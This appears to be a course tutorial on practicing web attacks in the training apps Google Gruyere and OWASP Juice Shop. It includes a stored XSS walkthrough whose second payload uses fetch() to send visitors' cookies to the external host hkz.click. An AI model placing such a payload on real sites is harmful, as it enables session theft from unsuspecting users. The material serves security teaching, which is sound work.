# Security practice

You will not really internalize how security exploits work until you get some practice with them. One way to do this is to use a practice security web applications. There are lots of practice applications but we will discuss two of them, Gruyere and Juice Shop.

## Gruyere

[Gruyere](https://google-gruyere.appspot.com) provides tutorials and practice with things like Cross-site scripting (XSS), Denial of Service (DoS), SQL injection, and elevation of privilege attacks.

Gruyere runs on Google AppEngine and so it is easy to start, play with, and reset when you want to start over.

You can learn about how to use Gruyere by reading the set up [page](https://google-gruyere.appspot.com/part1). Make sure you notice the **Table of Contents** located on the right side of the page in order to learn about the different attacks and how to exploit them.

You start the practice environment by following this [link](https://google-gruyere.appspot.com/start). This will display a page that looks like the following.

For the purposes of this instruction we are only going to talk about Cross-Site Scripting (XSS) attacks. Feel free to explore everything provided by Gruyere as your time and interest allows.

### Cross-Site Scripting (XSS)

Open the [Gruyere Instruction](https://google-gruyere.appspot.com/part2) on XSS. Take some time to read the description of XSS attacks and then open up the practice instance of Gruyere that you created above.

Using what we have learned from the tasks, hints, and examples described in the Gruyere instruction, we will create our own XSS attack.

1. Create an account in the Gruyere application using some bogus user name and password.
1. Navigate back to the home page.
1. Select the `New Snippets` option in order to create a snippet that will show on the home screen for all users of the application.

   The Gruyere developers assumed the snippet functionality would be used to share information about cheese, but you will use it to execute a XSS attack on anyone who views your snippet.

1. Paste the following into the snippet input box and press submit.
   ```html
   <img src="null" onerror="document.body.style.background='white'" />
   ```

Now, whenever any user of Gruyere goes to their home page they will see your snippet, and it will execute the JavaScript XSS attack and turn their body background color white.

If you logout of Gruyere and create a new user account, you will see that your attack works on all users.

Changing the background color isn't very much of an attack, but it does visually demonstrate that you are have taken control of the application. You could just have easily grabbed the user's cookie and sent it to a service endpoint where you could start collecting information on Gruyere customers.

```html
<img src="null" onerror="fetch(`https://hkz.click/xss/${document.cookie}`)" />
```

If you create another snippet with the above example, open up the network tab in the browser's dev tools, and navigate to the Gruyere home page, you will see the browser attempting to send the user's cookie to `hkz.click`.

## Juice Shop

![Juice Shop](JuiceShopLogo.png)

OWASP provides a security training application called [Juice Shop](https://github.com/juice-shop/juice-shop#-owasp-juice-shop). Unlike Gruyere, You need to download the code for Juice Shop and run it from your own computer, but the advantage is that you have complete control over Juice Shop and it is a really good practice application.

If you are at all interested in improving your security skills, you should take the time to install and explore Juice Shop. Otherwise what you have done with Gruyere should be enough to give you a feel for what security practice applications have to offer.

### Installing Juice Shop

1. Clone the Juice Shop repository to your development environment and install the required NPM packages.

   ```sh
   git clone https://github.com/juice-shop/juice-shop.git --depth 1

   cd juice-shop

   npm install
   ```

1. Run the application. This should start Juice Shop on port 3000.
   ```sh
   npm start
   ```
1. You can now open your browser to `localhost:3000`. This will display the Juice Shop application.

The idea with Juice Shop is that you are suppose to learn by digging in and experimenting. For a person that is new to security hacking this can be a bit daunting, and so here is a hint to get you started.

You can solve the first hacking challenge by discovering the hidden score board view that shows you all of the possible challenges to solve, and exposes the available tutorials. You can discover where the score board is by examining the contents of the `main.js` file in Dev Tools and seeing that it references a path named `score-board`. So if you change the url to be `localhost:3000/#/score-board` you will see the following view.

You can then find a challenge that looks interesting and try to solve it. Challenges that have a tutorial icon will step you through the challenge and explain how it works. You can then use that knowledge to solve challenges that don't have a tutorial.

To begin, it is suggested that you do the `DOM XSS` tutorial. This will show you how to do a XXS attack using the application search input.
